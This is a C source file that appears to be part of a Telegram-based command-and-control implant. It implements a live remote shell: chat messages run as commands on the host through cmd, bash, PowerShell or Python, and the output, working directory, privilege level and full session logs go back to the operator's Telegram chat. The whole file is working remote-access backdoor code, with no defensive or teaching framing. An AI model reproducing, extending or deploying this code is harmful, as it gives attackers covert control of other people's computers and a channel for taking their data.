/*
 * Copyright (C) 2026 roothunter
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */

#include "shell_live.h"
#include "shell.h"
#include "../crypto/crypto.h"
#include "../logging/logging.h"
#include "../runtime/runtime.h"
#include "../telegram/telegram.h"

#include <ctype.h>
#include <errno.h>
#include <stdatomic.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#ifdef _WIN32
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <direct.h>
#else
#include <unistd.h>
#endif

#define LIVE_SCREEN_MAX_CHARS 1800U
#define LIVE_HISTORY_MAX_BYTES 65536U

static atomic_int s_live_active = 0;
static int64_t s_live_message_id = 0;
static char s_screen_buffer[3200] = {0};
static char s_full_history[LIVE_HISTORY_MAX_BYTES] = {0};
static size_t s_full_history_len = 0;
static char s_shell_title[64] = "Default OS Shell";

static const char s_live_keyboard_active[] =
    "{\"inline_keyboard\":[["
    "{\"text\":\"📥 Log\",\"callback_data\":\"sh_live_log\"},"
    "{\"text\":\"🧹 Clear\",\"callback_data\":\"sh_live_cls\"},"
    "{\"text\":\"🛑 Ctrl+C\",\"callback_data\":\"sh_live_ctrlc\"}"
    "],["
    "{\"text\":\"🔄 Refresh\",\"callback_data\":\"sh_live_refresh\"},"
    "{\"text\":\"🚪 Exit\",\"callback_data\":\"sh_live_exit\"}"
    "]]}";

static const char s_live_keyboard_closed[] =
    "{\"inline_keyboard\":[["
    "{\"text\":\"📥 Download Log\",\"callback_data\":\"sh_live_log\"},"
    "{\"text\":\"🟢 Re-open Shell\",\"callback_data\":\"sh_live_reopen\"}"
    "]]}";

static void strip_ansi_in_place(char *str) {
  if (!str)
    return;
  char *src = str;
  char *dst = str;
  while (*src) {
    if (*src == '\x1b' && src[1] == '[') {
      src += 2;
      while (*src && !isalpha((unsigned char)*src) && *src != 'm' &&
             *src != 'K' && *src != 'H' && *src != 'J' && *src != 'h' && *src != 'l') {
        src++;
      }
      if (*src)
        src++;
    } else if (*src == '\x1b' && src[1] == ']') {
      /* OSC sequences like \x1b]0;Title\x07 or \x1b]0;Title\x1b\ */
      src += 2;
      while (*src && *src != '\x07' && *src != '\x1b') {
        src++;
      }
      if (*src == '\x07') {
        src++;
      } else if (*src == '\x1b' && src[1] == '\\') {
        src += 2;
      }
    } else if (*src == '\x07' || *src == '\x08') {
      /* Skip bell and backspace characters */
      src++;
    } else {
      *dst++ = *src++;
    }
  }
  *dst = '\0';
}

static size_t escape_terminal_html(const char *src, char *dst, size_t dst_cap) {
  if (!src || !dst || dst_cap == 0)
    return 0;
  size_t d = 0;
  for (size_t s = 0; src[s] && d + 8 < dst_cap; s++) {
    unsigned char c = (unsigned char)src[s];
    if (c == '\r') {
      /* Normalize CRLF to LF: skip \r if followed by \n */
      if (src[s + 1] == '\n')
        continue;
      dst[d++] = '\n';
    } else if (c == '<') {
      memcpy(dst + d, "&lt;", 4);
      d += 4;
    } else if (c == '>') {
      memcpy(dst + d, "&gt;", 4);
      d += 4;
    } else if (c == '&') {
      memcpy(dst + d, "&amp;", 5);
      d += 5;
    } else if (c == '"') {
      memcpy(dst + d, "&quot;", 6);
      d += 6;
    } else if (c >= 32 || c == '\n' || c == '\t') {
      dst[d++] = (char)c;
    }
  }
  dst[d] = '\0';
  return d;
}

static void append_to_screen(const char *text) {
  if (!text || !*text)
    return;

  size_t add_len = strlen(text);
  if (s_full_history_len + add_len < sizeof(s_full_history) - 1) {
    memcpy(s_full_history + s_full_history_len, text, add_len);
    s_full_history_len += add_len;
    s_full_history[s_full_history_len] = '\0';
  }

  size_t cur_len = strlen(s_screen_buffer);
  if (cur_len + add_len < LIVE_SCREEN_MAX_CHARS) {
    memcpy(s_screen_buffer + cur_len, text, add_len);
    s_screen_buffer[cur_len + add_len] = '\0';
  } else {
    /* Keep rolling window: discard oldest lines and append newest */
    size_t overflow = (cur_len + add_len) - LIVE_SCREEN_MAX_CHARS + 300;
    const char *start_pos = s_screen_buffer + overflow;
    const char *nl = strchr(start_pos, '\n');
    if (nl && *(nl + 1)) {
      start_pos = nl + 1;
    }
    size_t keep_len = strlen(start_pos);
    memmove(s_screen_buffer, start_pos, keep_len);
    s_screen_buffer[keep_len] = '\0';

    size_t copy_now = add_len;
    if (keep_len + copy_now >= sizeof(s_screen_buffer) - 1) {
      copy_now = sizeof(s_screen_buffer) - 1 - keep_len;
    }
    memcpy(s_screen_buffer + keep_len, text, copy_now);
    s_screen_buffer[keep_len + copy_now] = '\0';
  }
}

static char s_live_cwd[1024] = {0};
static c2t_shell_type_t s_active_shell_type = C2T_SHELL_AUTO;

static void render_live_message(char *out_html, size_t out_cap, int is_active) {
  if (!out_html || out_cap == 0)
    return;

  char esc_screen[2600] = {0};
  escape_terminal_html(s_screen_buffer, esc_screen, sizeof(esc_screen));

  const char *priv = c2t_runtime_get_privilege_str();
  const char *cur_dir = s_live_cwd[0] ? s_live_cwd : ".";

  if (is_active) {
    snprintf(out_html, out_cap,
             "🟢 <b>Live Interactive Shell Console</b>\n"
             "• <b>Shell:</b> <code>%s</code>\n"
             "• <b>Directory:</b> <code>%s</code>\n"
             "• <b>Privileges:</b> %s\n"
             "• <b>Status:</b> ⚡ <i>Live (all chat messages are executed directly in shell)</i>\n\n"
             "<pre><code class=\"language-text\">%s</code></pre>\n\n"
             "💡 <i>Type any command (e.g. <code>dir</code>, <code>ls</code>, <code>whoami</code>) or <code>exit</code> to close.</i>",
             s_shell_title, cur_dir, priv,
             esc_screen[0] ? esc_screen : "(Terminal session ready. Type a command...)");
  } else {
    snprintf(out_html, out_cap,
             "⚪ <b>Live Shell Console (Disconnected)</b>\n"
             "• <b>Shell:</b> <code>%s</code>\n"
             "• <b>Directory:</b> <code>%s</code>\n"
             "• <b>Status:</b> ⏹️ <i>Session closed</i>\n\n"
             "<pre><code class=\"language-text\">%s</code></pre>\n\n"
             "💡 <i>Use <code>/shell_live</code> or tap Re-open to start a live session.</i>",
             s_shell_title, cur_dir,
             esc_screen[0] ? esc_screen : "(No terminal output recorded)");
  }
  c2t_secure_zero(esc_screen, sizeof(esc_screen));
}

int c2t_shell_live_is_active(void) {
  return atomic_load(&s_live_active);
}

int c2t_shell_live_start(const char *shell_name) {
  c2t_shell_type_t st = C2T_SHELL_AUTO;
  const char *name = "cmd";
#ifdef _WIN32
  st = C2T_SHELL_CMD;
  name = "cmd";
#else
  st = C2T_SHELL_BASH;
  name = "bash";
#endif

  if (shell_name && *shell_name) {
    while (isspace((unsigned char)*shell_name)) shell_name++;
#ifdef _WIN32
    if (_stricmp(shell_name, "bash") == 0) { st = C2T_SHELL_BASH; name = "bash"; }
    else if (_stricmp(shell_name, "ps") == 0 || _stricmp(shell_name, "powershell") == 0 || _stricmp(shell_name, "pwsh") == 0) { st = C2T_SHELL_POWERSHELL; name = "powershell"; }
    else if (_stricmp(shell_name, "cmd") == 0) { st = C2T_SHELL_CMD; name = "cmd"; }
    else if (_stricmp(shell_name, "py") == 0 || _stricmp(shell_name, "python") == 0) { st = C2T_SHELL_PYTHON; name = "python"; }
#else
    if (strcasecmp(shell_name, "bash") == 0) { st = C2T_SHELL_BASH; name = "bash"; }
    else if (strcasecmp(shell_name, "zsh") == 0) { st = C2T_SHELL_ZSH; name = "zsh"; }
    else if (strcasecmp(shell_name, "ps") == 0 || strcasecmp(shell_name, "powershell") == 0) { st = C2T_SHELL_POWERSHELL; name = "powershell"; }
    else if (strcasecmp(shell_name, "py") == 0 || strcasecmp(shell_name, "python") == 0) { st = C2T_SHELL_PYTHON; name = "python"; }
#endif
  }

  s_active_shell_type = st;
  snprintf(s_shell_title, sizeof(s_shell_title), "%s", name);

#ifdef _WIN32
  if (s_live_cwd[0] == '\0') {
    GetCurrentDirectoryA(sizeof(s_live_cwd), s_live_cwd);
  }
#else
  if (s_live_cwd[0] == '\0') {
    if (getcwd(s_live_cwd, sizeof(s_live_cwd)) == nullptr) {
      strncpy(s_live_cwd, ".", sizeof(s_live_cwd) - 1);
    }
  }
#endif

  c2t_log_info("live_shell", "Starting interactive live shell '%s' in directory '%s'",
               s_shell_title, s_live_cwd);

  atomic_store(&s_live_active, 1);

  if (s_screen_buffer[0] == '\0') {
    char banner[256];
    snprintf(banner, sizeof(banner), "=== Live %s Console Started [%s] ===\n",
             s_shell_title, c2t_runtime_get_privilege_str());
    append_to_screen(banner);
  }

  char msg_html[4000] = {0};
  render_live_message(msg_html, sizeof(msg_html), 1);

  int64_t msg_id = 0;
  int ok = telegram_send_html_keyboard_get_id(msg_html, s_live_keyboard_active, &msg_id);
  if (ok && msg_id > 0) {
    s_live_message_id = msg_id;
    c2t_log_info("live_shell", "Live interactive console message created (ID: %lld)",
                 (long long)msg_id);
  }

  (void)telegram_send_message_draft(209, "🟢 Live Shell Active: Send any command directly in chat...");
  return ok;
}

int c2t_shell_live_handle_input(const char *input_text) {
  if (!input_text || !c2t_shell_live_is_active())
    return 0;

  const char *p = input_text;
  while (*p && isspace((unsigned char)*p)) p++;
  if (!*p)
    return 1;

  /* Check for exit command */
  if (strcmp(p, "exit") == 0 || strcmp(p, "/exit") == 0 ||
      strcmp(p, "quit") == 0 || strcmp(p, "/quit") == 0 ||
      strcmp(p, "/sh_exit") == 0 || strcmp(p, "/live_exit") == 0 ||
      strcmp(p, "/sh_stop") == 0 || strcmp(p, "/shell_stop") == 0) {
    (void)c2t_shell_live_stop();
    telegram_send_html("🚪 <b>Live Shell Mode Exited</b>\n<i>Returning to normal bot command mode. Use <code>/shell_live</code> to re-enter.</i>");
    return 1;
  }

  /* Any Telegram bot command starting with '/' passes through to listener */
  if (*p == '/') {
    return 0;
  }

  /* Live draft notification */
  char draft[256];
  snprintf(draft, sizeof(draft), "⌨️ Executing: %s", p);
  (void)telegram_send_message_draft(209, draft);
  (void)telegram_send_chat_action("typing");

  /* Record command prompt */
  char prompt_line[300];
  snprintf(prompt_line, sizeof(prompt_line), "\n$ %s\n", p);
  append_to_screen(prompt_line);

  c2t_log_info("live_shell", "Executing live shell command: '%s' (cwd: '%s')",
               p, s_live_cwd[0] ? s_live_cwd : ".");

  /* Handle 'cd' directory change */
  if (strcmp(p, "cd") == 0 || strncmp(p, "cd ", 3) == 0) {
    const char *target = (strcmp(p, "cd") == 0) ? "" : p + 3;
    while (*target && isspace((unsigned char)*target)) target++;
    if (!*target) {
#ifdef _WIN32
      target = getenv("USERPROFILE");
#else
      target = getenv("HOME");
#endif
      if (!target) target = ".";
    }

    char resolved[1024] = {0};
#ifdef _WIN32
    if (isalpha((unsigned char)target[0]) && target[1] == ':') {
      snprintf(resolved, sizeof(resolved), "%.1000s", target);
    } else if (s_live_cwd[0]) {
      snprintf(resolved, sizeof(resolved), "%.500s\\%.500s", s_live_cwd, target);
    } else {
      snprintf(resolved, sizeof(resolved), "%.1000s", target);
    }

    if (SetCurrentDirectoryA(resolved)) {
      GetCurrentDirectoryA(sizeof(s_live_cwd), s_live_cwd);
      char resp[1200];
      snprintf(resp, sizeof(resp), "📁 <b>Working Directory:</b> <code>%s</code>", s_live_cwd);
      append_to_screen(resp);
      append_to_screen("\n");
      telegram_send_html(resp);
      c2t_log_info("live_shell", "Changed directory to: '%s'", s_live_cwd);
    } else {
      char resp[512];
      snprintf(resp, sizeof(resp), "⚠️ <b>Cannot access directory:</b> <code>%s</code>", target);
      telegram_send_html(resp);
      c2t_log_warning("live_shell", "Failed to change directory to: '%s'", target);
    }
#else
    if (target[0] == '/') {
      snprintf(resolved, sizeof(resolved), "%.1000s", target);
    } else if (s_live_cwd[0]) {
      snprintf(resolved, sizeof(resolved), "%.500s/%.500s", s_live_cwd, target);
    } else {
      snprintf(resolved, sizeof(resolved), "%.1000s", target);
    }

    if (chdir(resolved) == 0) {
      if (getcwd(s_live_cwd, sizeof(s_live_cwd)) == nullptr) {
        snprintf(s_live_cwd, sizeof(s_live_cwd), "%s", resolved);
      }
      char resp[1200];
      snprintf(resp, sizeof(resp), "📁 <b>Working Directory:</b> <code>%s</code>", s_live_cwd);
      append_to_screen(resp);
      append_to_screen("\n");
      telegram_send_html(resp);
      c2t_log_info("live_shell", "Changed directory to: '%s'", s_live_cwd);
    } else {
      char resp[512];
      snprintf(resp, sizeof(resp), "⚠️ <b>Cannot access directory:</b> <code>%s</code>\n<i>%s</i>",
               target, strerror(errno));
      telegram_send_html(resp);
      c2t_log_warning("live_shell", "Failed to change directory to: '%s': %s", target, strerror(errno));
    }
#endif

    char msg_html[4000] = {0};
    render_live_message(msg_html, sizeof(msg_html), 1);
    if (s_live_message_id > 0) {
      (void)telegram_edit_message_html(s_live_message_id, msg_html, s_live_keyboard_active);
    }
    (void)telegram_clear_message_draft(209);
    return 1;
  }

  /* Execute arbitrary shell command in live context */
  c2t_shell_options_t opts = {
      .command = p,
      .shell_type = s_active_shell_type,
      .stdin_data = nullptr,
      .stdin_data_len = 0,
      .timeout_ms = 30000,
      .working_dir = s_live_cwd[0] ? s_live_cwd : nullptr,
  };

  c2t_shell_result_t res;
  memset(&res, 0, sizeof(res));
  int exec_ok = c2t_shell_execute_ex(&opts, &res);

  if (exec_ok) {
    c2t_log_info("live_shell", "Command '%s' completed in %llu ms (output: %llu bytes, exit: %d)",
                 p, (unsigned long long)res.duration_ms, (unsigned long long)res.output_len, res.exit_code);

    if (res.output && *res.output) {
      strip_ansi_in_place(res.output);
      append_to_screen(res.output);
      char esc_out[3500];
      escape_terminal_html(res.output, esc_out, sizeof(esc_out));
      char reply_buf[4096];
      if (strlen(esc_out) > 0) {
        if (res.exit_code == 0) {
          snprintf(reply_buf, sizeof(reply_buf),
                   "⚡ <b>$ %s</b>\n<pre><code class=\"language-shell\">%s</code></pre>",
                   p, esc_out);
        } else {
          snprintf(reply_buf, sizeof(reply_buf),
                   "⚡ <b>$ %s</b> (❌ Exit: %d)\n<pre><code class=\"language-shell\">%s</code></pre>",
                   p, res.exit_code, esc_out);
        }
      } else {
        snprintf(reply_buf, sizeof(reply_buf),
                 "⚡ <b>$ %s</b> (Exit: %d)\n<i>(Executed with no output)</i>", p, res.exit_code);
      }
      (void)telegram_send_html(reply_buf);
    } else {
      char reply_buf[256];
      snprintf(reply_buf, sizeof(reply_buf),
               "⚡ <b>$ %s</b> (Exit: %d)\n<i>(Executed with no output)</i>", p, res.exit_code);
      (void)telegram_send_html(reply_buf);
    }
  } else {
    c2t_log_warning("live_shell", "Command '%s' failed execution", p);
    char err_buf[512];
    snprintf(err_buf, sizeof(err_buf),
             "⚠️ <b>Command Execution Failed:</b> <code>%s</code>\n<i>Unable to spawn child process or command timed out.</i>",
             p);
    telegram_send_html(err_buf);
  }

  c2t_shell_result_free(&res);

  /* Live update the interactive terminal message in place */
  char msg_html[4000] = {0};
  render_live_message(msg_html, sizeof(msg_html), c2t_shell_live_is_active());

  if (s_live_message_id > 0) {
    (void)telegram_edit_message_html(s_live_message_id, msg_html,
                                     c2t_shell_live_is_active() ? s_live_keyboard_active : s_live_keyboard_closed);
  }

  (void)telegram_clear_message_draft(209);
  return 1;
}

int c2t_shell_live_handle_callback(const char *callback_query_id,
                                   const char *callback_data) {
  if (!callback_data)
    return 0;

  c2t_log_info("live_shell", "Live shell callback received: '%s' (query ID: %s)",
               callback_data, callback_query_id ? callback_query_id : "");

  if (strcmp(callback_data, "sh_live_log") == 0) {
    (void)telegram_answer_callback_query(callback_query_id, "📥 Generating full terminal log...");
    if (s_full_history_len > 0) {
      char filename[64];
      snprintf(filename, sizeof(filename), "terminal_session_%llu.log",
               (unsigned long long)time(nullptr));
      c2t_log_info("live_shell", "Sending terminal session log (%llu bytes) as '%s'",
                   (unsigned long long)s_full_history_len, filename);
      return telegram_send_file(s_full_history, s_full_history_len, "text/plain",
                                filename, nullptr);
    } else {
      return telegram_send_html("ℹ️ <i>No terminal output recorded yet.</i>");
    }
  }

  if (strcmp(callback_data, "sh_live_cls") == 0) {
    (void)telegram_answer_callback_query(callback_query_id, "🧹 Screen cleared");
    s_screen_buffer[0] = '\0';
    char banner[128];
    snprintf(banner, sizeof(banner), "=== Terminal Cleared ===\n");
    append_to_screen(banner);
    c2t_log_info("live_shell", "Terminal screen cleared by user");

    char msg_html[4000] = {0};
    render_live_message(msg_html, sizeof(msg_html), c2t_shell_live_is_active());
    if (s_live_message_id > 0) {
      (void)telegram_edit_message_html(s_live_message_id, msg_html,
                                      c2t_shell_live_is_active() ? s_live_keyboard_active : s_live_keyboard_closed);
    }
    return 1;
  }

  if (strcmp(callback_data, "sh_live_ctrlc") == 0) {
    (void)telegram_answer_callback_query(callback_query_id, "🛑 Ctrl+C sent (SIGINT)");
    append_to_screen("\n^C\n");
    c2t_log_info("live_shell", "Sending Ctrl+C (SIGINT) to interactive shell");
    c2t_shell_result_t res;
    memset(&res, 0, sizeof(res));
    static const char sigint_buf[] = "\x03\r\n";
    (void)c2t_shell_session_write(sigint_buf, sizeof(sigint_buf) - 1, &res, 600);
    if (res.output && *res.output) {
      strip_ansi_in_place(res.output);
      append_to_screen(res.output);
    }
    c2t_shell_result_free(&res);

    char msg_html[4000] = {0};
    render_live_message(msg_html, sizeof(msg_html), c2t_shell_live_is_active());
    if (s_live_message_id > 0) {
      (void)telegram_edit_message_html(s_live_message_id, msg_html,
                                      c2t_shell_live_is_active() ? s_live_keyboard_active : s_live_keyboard_closed);
    }
    return 1;
  }

  if (strcmp(callback_data, "sh_live_refresh") == 0) {
    (void)telegram_answer_callback_query(callback_query_id, "🔄 Refreshed");
    c2t_log_info("live_shell", "Terminal refresh requested");
    c2t_shell_result_t res;
    memset(&res, 0, sizeof(res));
    (void)c2t_shell_session_write("", 0, &res, 400);
    if (res.output && *res.output) {
      strip_ansi_in_place(res.output);
      append_to_screen(res.output);
    }
    c2t_shell_result_free(&res);

    char msg_html[4000] = {0};
    render_live_message(msg_html, sizeof(msg_html), c2t_shell_live_is_active());
    if (s_live_message_id > 0) {
      (void)telegram_edit_message_html(s_live_message_id, msg_html,
                                      c2t_shell_live_is_active() ? s_live_keyboard_active : s_live_keyboard_closed);
    }
    return 1;
  }

  if (strcmp(callback_data, "sh_live_exit") == 0) {
    (void)telegram_answer_callback_query(callback_query_id, "🚪 Exited live mode");
    c2t_log_info("live_shell", "Exiting live shell mode via inline button");
    (void)c2t_shell_live_stop();
    return 1;
  }

  if (strcmp(callback_data, "sh_live_reopen") == 0) {
    (void)telegram_answer_callback_query(callback_query_id, "🟢 Re-opening live shell...");
    c2t_log_info("live_shell", "Re-opening live shell via inline button");
    return c2t_shell_live_start(nullptr);
  }

  return 0;
}

int c2t_shell_live_stop(void) {
  c2t_log_info("live_shell", "Stopping live interactive mode (session recorded: %llu bytes)",
               (unsigned long long)s_full_history_len);
  atomic_store(&s_live_active, 0);

  char msg_html[4000] = {0};
  render_live_message(msg_html, sizeof(msg_html), 0);

  if (s_live_message_id > 0) {
    (void)telegram_edit_message_html(s_live_message_id, msg_html, s_live_keyboard_closed);
  }

  (void)telegram_clear_message_draft(209);
  return 1;
}

void c2t_shell_live_reset(void) {
  atomic_store(&s_live_active, 0);
  s_live_message_id = 0;
  c2t_secure_zero(s_screen_buffer, sizeof(s_screen_buffer));
  c2t_secure_zero(s_full_history, sizeof(s_full_history));
  s_full_history_len = 0;
  (void)telegram_clear_message_draft(209);
}
